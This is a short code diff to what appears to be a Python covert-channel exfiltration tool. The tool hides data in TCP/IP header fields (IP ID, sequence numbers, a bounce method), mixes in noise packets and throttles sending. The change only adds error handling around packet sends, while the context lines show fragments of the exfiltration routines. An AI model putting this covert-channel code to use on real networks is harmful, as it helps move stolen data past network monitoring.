@@ -250,7 +250,11 @@ def add_n0ise_iseq(i):
     pkt.seq = y + randy
     # Signal noisy packet
     pkt.window = int(8182) - random.randint(23, 275)
-    send(pkt)
+    try:
+        send(pkt)
+    except socket.error:
+        print "\nERROR: Problem sending packets, are you root?\n"
+        exit(0)
 
 
 def add_n0ise_ipid(i):
@@ -261,7 +265,11 @@ def add_n0ise_ipid(i):
     pkt.seq = y + randy
     # Signal noisy packet
     pkt.window = int(8182) - random.randint(23, 275)
-    send(pkt)
+    try:
+        send(pkt)
+    except socket.error:
+        print "\nERROR: Problem sending packets, are you root?\n"
+        exit(0)
 
 
 # In IPv4, the Identification (ID) field is a 16-bit value.
@@ -276,7 +284,11 @@ def exfil_ipid():
         add_n0ise_ipid(i)
         pkt.id = exfilArray[i]
         time.sleep(0.4)
-        send(pkt)
+        try:
+            send(pkt)
+        except socket.error:
+            print "\nERROR: Problem sending packets, are you root?\n"
+            exit(0)
         i += 1
     send_eom()
 
@@ -291,7 +303,11 @@ def exfil_iseq():
         pkt.seq = exfilArray[i]
         # slow our roll
         time.sleep(0.4)
-        send(pkt)
+        try:
+            send(pkt)
+        except socket.error:
+            print "\nERROR: Problem sending packets, are you root?\n"
+            exit(0)
         i += 1
     send_eom()
 
@@ -307,7 +323,11 @@ def exfil_bounce():
         pkt.window = k
         pkt.seq = exfilArray[i]
         time.sleep(0.4)
-        send(pkt)
+        try:
+            send(pkt)
+        except socket.error:
+            print "\nERROR: Problem sending packets, are you root?\n"
+            exit(0)
         i += 1
     send_eom()
 
